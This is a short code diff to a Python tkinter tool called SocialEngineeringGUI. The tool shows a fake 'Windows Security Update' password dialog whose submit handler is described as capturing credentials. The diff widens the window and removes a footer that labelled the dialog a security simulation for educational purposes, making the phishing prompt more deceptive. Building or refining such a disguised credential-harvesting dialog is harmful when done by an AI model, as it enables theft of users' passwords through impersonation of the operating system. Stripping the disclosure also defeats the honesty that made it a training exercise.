@@ -161,7 +161,7 @@ class SocialEngineeringGUI:
         """Build the tkinter password dialog."""
         self.root = tk.Tk()
         self.root.title("Windows Security Update")
-        self.root.geometry("420x450")
+        self.root.geometry("420x480")
         self.root.resizable(False, False)
         self.root.configure(bg="#f0f0f0")
         self.root.protocol("WM_DELETE_WINDOW", self.on_close)
@@ -283,15 +283,6 @@ class SocialEngineeringGUI:
             cursor="hand2",
             command=self.on_close,
         ).pack(fill="x", ipady=8)
-
-        # Footer
-        tk.Label(
-            self.root,
-            text="This is a security simulation for educational purposes.",
-            font=("Segoe UI", 7),
-            fg="#999",
-            bg="#f0f0f0",
-        ).pack(side="bottom", pady=(0, 5))
 
     def on_submit(self):
         """Handle form submission - captures credentials."""
